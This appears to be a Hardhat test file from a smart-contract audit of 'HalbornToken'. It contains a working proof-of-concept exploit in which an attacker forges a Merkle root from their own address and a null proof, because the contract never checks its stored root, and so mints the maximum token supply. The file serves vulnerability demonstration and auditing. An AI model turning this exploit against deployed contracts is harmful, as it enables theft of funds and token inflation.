const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[HalbornToken] Exploits', function() {
	let attacker;

	beforeEach(async function() {
		[deployer, whitelisted, attacker] = await ethers.getSigners();

		let whitelistedHash = ethers.utils.solidityKeccak256(['address'], [whitelisted.address]);
		
		// Create bytes32 proof from a "password" 
		let proof = ethers.utils.keccak256(ethers.utils.id("S3CUR3_PR00F"));
		
		// Root is keccak256 of the whitelisted address hash and "password" proof that will pass the 'verify' function
		let root = ethers.utils.solidityKeccak256(
			['bytes32', 'bytes32'], 
			ethers.BigNumber.from(whitelistedHash) > ethers.BigNumber.from(proof) ? [proof, whitelistedHash] : [whitelistedHash, proof] // Check hashing order for MerkleTree
		);
		// console.log("[JS]\nhash:", whitelistedHash, '\nproof:', proof, '\nroot:', root);

		let deployerFunds = ethers.utils.parseEther('100000');
		this.token = await (await ethers.getContractFactory('HalbornToken', deployer)).deploy(
			"HalbornToken", // Name
			"HAL", // Symbol
			deployerFunds, // Minted amount for deployer 
			deployer.address, // Deployer address
			root
		);

		expect(
			await this.token.balanceOf(deployer.address)
		).to.be.equal(deployerFunds); // Check deployer minted tokens

		let whitelistedFunds = ethers.utils.parseEther('10');
		await (await this.token.connect(whitelisted)).mintTokensWithWhitelist(whitelistedFunds, root, [proof]); // Check validity of root + proof
		expect(
			await this.token.balanceOf(whitelisted.address)
		).to.be.equal(whitelistedFunds); // Funds have been minted for whitelisted user

		this.attackerInstance = await this.token.connect(attacker);
	});

	it('[Exploit #1] \'root\' variable of the contract is set but never used', async function() {
		let attackerHash = ethers.utils.solidityKeccak256(['address'], [attacker.address]);
		let proof = ethers.constants.HashZero; // Null proof
		let root = ethers.utils.solidityKeccak256(['bytes32', 'bytes32'], [proof, attackerHash]); // Create valid root from attacker's address and empty proof
		
		let attackerFunds = ethers.constants.MaxUint256.sub(await this.token.totalSupply()); // Mint max amount of tokens available

		await this.attackerInstance.mintTokensWithWhitelist(attackerFunds, root, [proof]);
		expect(
			await this.token.balanceOf(attacker.address)
		).to.be.equal(attackerFunds);
	});
});